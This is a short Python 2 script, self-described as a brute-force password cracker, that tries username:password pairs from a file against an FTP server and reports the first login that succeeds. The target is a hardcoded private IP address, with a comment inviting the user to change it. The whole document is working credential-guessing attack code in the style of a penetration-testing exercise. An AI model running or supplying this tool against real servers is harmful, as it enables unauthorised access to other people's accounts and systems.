'''
Brute force password cracker to login to FTP server
'''

import ftplib

# Takes a hostname and file of username-password pairs in form of <username>:<password>
# If ftp login success, returns a tuple of username, password
# Else returns a tuple of None, None
def bruteLogin(host, pwFile):
	f = open(pwFile, 'r')

	for line in f.readlines():
		user = line.split(':')[0]
		pw = line.split(':')[1].strip('\r').strip('\n')
		print '[+] Trying: ' + user + '/' + pw

		try:
			ftp = ftplib.FTP(host)
			ftp.login(user, pw)
			print '\n[*] ' + host + ' FTP login success: ' + user + '/' + pw
			ftp.quit()
			return (user, pw)
		except Exception, e:
			pass

	print '\n[-] FTP login attempts failed'
	return (None, None)

# Change to the host you want to connect to
host = '192.168.95.179'
pwFile = 'passwords.txt'
bruteLogin(host, pwFile)